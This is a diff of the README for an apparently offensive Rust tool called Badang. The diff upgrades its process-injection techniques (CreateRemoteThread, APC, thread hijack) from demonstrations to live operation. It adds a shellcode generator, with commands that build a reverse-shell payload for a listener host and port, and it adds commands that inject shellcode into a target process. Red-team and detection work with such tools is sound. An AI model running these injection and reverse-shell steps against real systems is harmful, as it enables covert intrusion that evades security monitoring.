@@ -39,27 +39,30 @@ Each technique includes detailed documentation of how it works, why it can bypas
 | Module | Description |
 |--------|-------------|
 | **Syscall** | Direct syscall invocation with Windows syscall number reference table (13 NT APIs) |
-| **Injection** | 3 process injection techniques; **live CreateRemoteThread injection** + step-by-step documentation for all |
+| **Injection** | 3 live process injection techniques: CreateRemoteThread, APC Injection, Thread Hijack (SetThreadContext) |
 | **Unhook** | API unhooking via memory comparison and byte restoration |
 | **Detect** | Hook detection analysis — identify hooked APIs in target processes |
 | **Safety** | Built-in safety controls: `--dry-run` mode, `--pid` required, system process protection, payload verification |
 
-## Payload Formats
+## Payload Generation
 
-Badang accepts raw shellcode payloads from standard generators:
+Badang includes a built-in x86_64 shellcode generator — no msfvenom needed:
 
 ```bash
-# Example: generate a payload (authorized testing only)
-msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
+# Generate a WinExec payload
+badang-cli.exe generate --type exec --command "calc.exe" -o payload.bin
+
+# Generate a reverse shell
+badang-cli.exe generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
 ```
 
-Before injecting, use the `load` command to verify the payload file is accessible:
+All payloads use PEB walking (`gs:[0x60]` → kernel32) and ROR13 API hashing. Types: `exec`, `messagebox`, `reverse_tcp`, `bind_tcp`, `nop`.
+
+External payloads are also supported — use `load` to verify before injecting:
 
 ```bash
 badang-cli.exe load --payload shellcode.bin
 ```
-
-This will show the payload size and first bytes, confirming the file can be read before attempting any injection operation.
 
 ### Safety Framework
 
@@ -138,10 +141,10 @@ gh run list --repo aimansam/badang
 ### Cross-Platform Build
 
 ```bash
-# Build Windows binary from Linux
-rustup target add x86_64-pc-windows-msvc
-cargo build --release --target x86_64-pc-windows-msvc
-# Output: target/x86_64-pc-windows-msvc/release/badang.exe
+# Build Windows binaries from Linux
+rustup target add x86_64-pc-windows-gnu
+cargo build --release --target x86_64-pc-windows-gnu            # CLI
+cargo build --release --target x86_64-pc-windows-gnu --features gui  # GUI
 ```
 
 ---
@@ -175,11 +178,12 @@ cargo build --release --bin badang --features gui
 For Windows targets from Linux/macOS:
 
 ```bash
-# Add Windows target
-rustup target add x86_64-pc-windows-msvc
+# Add Windows target (GNU toolchain — requires mingw-w64)
+rustup target add x86_64-pc-windows-gnu
 
-# Build for Windows
-cargo build --release --target x86_64-pc-windows-msvc
+# Build CLI and GUI for Windows
+cargo build --release --target x86_64-pc-windows-gnu
+cargo build --release --target x86_64-pc-windows-gnu --features gui
 ```
 
 ---
@@ -217,7 +221,9 @@ badang-cli.exe inject --pid 1234 --technique CreateRemote
 badang-cli.exe load --payload shellcode.bin
 
 # LIVE injection (requires --execute --confirm)
-badang-cli.exe inject --pid 1234 --technique CreateRemote --payload shellcode.bin --execute --confirm
+badang-cli.exe inject --pid 1234 --technique createremote --payload shellcode.bin --execute --confirm
+badang-cli.exe inject --pid 1234 --technique apc --payload shellcode.bin -x -c
+badang-cli.exe inject --pid 1234 --technique hijack --payload shellcode.bin -x -c
 
 # API unhooking demonstration (DRY RUN)
 badang-cli.exe unhook --func NtCreateFile
@@ -229,8 +235,12 @@ badang-cli.exe unhook --func NtCreateFile
 |---------|-------------|------------------|
 | `analyze` | Detect hooked APIs in a target process | Yes |
 | `syscall` | Invoke a function via direct syscall | No |
-| `inject` | Demonstrate process injection technique | Yes |
+| `inject` | Process injection (CreateRemoteThread / APC / Thread Hijack) | Yes |
 | `unhook` | Demonstrate API unhooking | No |
+| `generate` | Generate shellcode payload (exec/msgbox/reverse/bind) | No |
+| `convert` | Convert shellcode between formats | No |
+| `load` | Load and verify a shellcode payload file | No |
+| `scan` | List running processes (pick a target PID) | No |
 
 ### Safety Flags
 
@@ -277,13 +287,11 @@ This skips the hooked `ntdll.dll` entirely, going straight from user-mode to ker
 
 ### Process Injection
 
-Badang documents 3 injection techniques:
+Badang implements 3 live injection techniques (all operational with `--execute --confirm`):
 
-1. **CreateRemoteThread** — Allocate + write memory in target, create remote thread
-2. **APC Injection** — Queue an APC to a target thread to execute injected code
-3. **Thread Hijack** — Suspend a thread, modify its context to redirect execution
-
-Each technique is demonstrated in dry-run mode with step-by-step documentation.
+1. **CreateRemoteThread** — Allocate + write shellcode in target process, create remote thread to execute it. Classic 6-step pipeline: OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → CreateRemoteThread → WaitForSingleObject.
+2. **APC Injection** — Wrap shellcode in a callee-save trampoline, write to target, enumerate threads via ToolHelp, queue APC to all threads. Executes when a thread enters an alertable wait state. No new thread created.
+3. **Thread Hijack (SetThreadContext)** — Suspend an existing thread, save full register context (all GPRs + RFLAGS), redirect RIP to shellcode wrapped in a full-register-save trampoline with completion flag. Poll for completion, then restore original context so the thread continues normally. No new thread, no APC — hardest to detect.
 
 ### API Unhooking
 
@@ -311,13 +319,22 @@ badang/
 ├── .github/
 │   └── workflows/
 │       └── ci.yml          # GitHub Actions CI/CD
+├── docs/                   # Documentation
+│   ├── build.md            # Build & architecture
+│   ├── cli.md              # CLI usage reference
+│   ├── features.md         # Feature overview
+│   ├── gui.md              # GUI usage guide
+│   ├── hooking.md          # EDR hooking explained
+│   └── killchain.md        # Badang in the kill chain
 ├── src/
 │   ├── lib.rs              # Library crate root (shared modules)
 │   ├── log.rs              # Shared logging sink (CLI + GUI)
 │   ├── cli.rs              # Command-line argument parsing
 │   ├── safety.rs           # Safety controls and validation
 │   ├── syscall.rs          # Direct syscall invocation module
-│   ├── injection.rs        # Process injection techniques
+│   ├── injection.rs        # Process injection (CRT, APC, Thread Hijack)
+│   ├── generate.rs         # Shellcode generator (PEB walk + template patch)
+│   ├── payload.rs          # Byte format converter + hex dump
 │   ├── unhook.rs           # API unhooking module
 │   ├── detect.rs           # Hook detection analysis
 │   ├── tests.rs            # Integration tests
